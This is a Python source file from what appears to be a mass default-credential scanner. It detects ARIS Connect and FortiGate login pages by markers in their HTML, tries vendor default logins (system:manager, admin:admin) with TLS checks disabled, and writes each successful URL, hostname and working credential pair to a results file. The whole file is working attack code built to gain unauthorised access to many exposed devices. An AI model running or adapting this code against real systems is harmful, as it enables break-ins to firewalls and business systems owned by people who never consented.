import threading
import requests
import re
import socket
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
from enum import Enum


disable_warnings(InsecureRequestWarning)
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

class URL_STATUS(Enum):
    VALID = 0
    NOT_RECOGNIZED = 1
    NOT_VALID = 2
    MANUAL = 3
    KNOWN_BAD = 4

class SiteTemplateBase:
    
    def __init__(self, name: str):
        self.name = name

    def check(self, url, source_code, verbose = False) -> URL_STATUS:
        """
        Override this method in subclasses to implement a basic check (e.g., connectivity).
        """
        raise NotImplementedError("check() must be implemented by subclasses.")
    
    def on_success(self, url, hostname, username, password):
        from src.url.url import error_lock, valid_lock, valid_url_lock, valid_template_lock, known_bads_lock, manual_lock, nv_error, nv_manual, nv_no_template, nv_no_valid, nv_valid
        with valid_lock:
            with open(nv_valid, "a") as file:
                file.write(f"{url}{f" | {hostname}" if hostname else ""} => {self.name} => {username}:{password}\n")
        print(f"{url} => {self.name}{f" | {hostname}" if hostname else ""} => {username}:{password}")

    def on_failure(self, url, hostname):
        from src.url.url import error_lock, valid_lock, valid_url_lock, valid_template_lock, known_bads_lock, manual_lock, nv_error, nv_manual, nv_no_template, nv_no_valid, nv_valid
        with valid_template_lock:
            with open(nv_no_valid, "a") as file:
                file.write(f"{url}{f" | {hostname}" if hostname else ""} => {self.name}\n")
    
    @staticmethod
    def get_dns_name(url):
        try:
            pattern = r'https?://(.*):'
            match_hostname = re.match(pattern, url)
            if match_hostname:
                ip = match_hostname.group(1)
                hostname, _, _ = socket.gethostbyaddr(ip)
                return hostname
        except Exception as e:
            return None
    
class ArisconnectTemplate(SiteTemplateBase):
    def __init__(self):
        super().__init__("ARIS Connect")

    def check(self, url, source_code, verbose = False) -> URL_STATUS:
        if "ARISWebUiKit" in source_code:
            found = False
            hostname = SiteTemplateBase.get_dns_name(url)

            username = "system"
            password = "manager"

            res = requests.post(url + "/copernicus/default/service/login", verify=False, data={"schema": "0", "alias":username, "password": password})
            
            if "SUCCESSFUL" in res.text:
                self.on_success(url, hostname, username, password)
                found = True

            if not found:
                self.on_failure(url, hostname)

                return URL_STATUS.NOT_VALID
            return URL_STATUS.VALID
        else:
            return URL_STATUS.NOT_RECOGNIZED

class FortigateTemplate(SiteTemplateBase):
    def __init__(self):
        super().__init__("FortiGate")

    def check(self, url, source_code, verbose=False) -> URL_STATUS:
        res = requests.get(url + "/login", verify=False, timeout=15)
        if "logon_merge.gif" in res.text or \
            "ftnt-fortinet-grid" in res.text or \
            "<title>FortiGate</title>" in res.text:
            found = False

            username = "admin"
            password = "admin"
            hostname = hostname = SiteTemplateBase.get_dns_name(url)

            res = requests.post(url + "/logincheck", data={"username" : username, "password": password}, verify=False)
            if not "Authentication failure" in res.text and not "Unable to contact server" in res.text:
                self.on_success(url, hostname, username, password)
                found = True
                        
            if not found:
                self.on_failure(url, hostname)

                return URL_STATUS.NOT_VALID
            return URL_STATUS.VALID
        else:
            return URL_STATUS.NOT_RECOGNIZED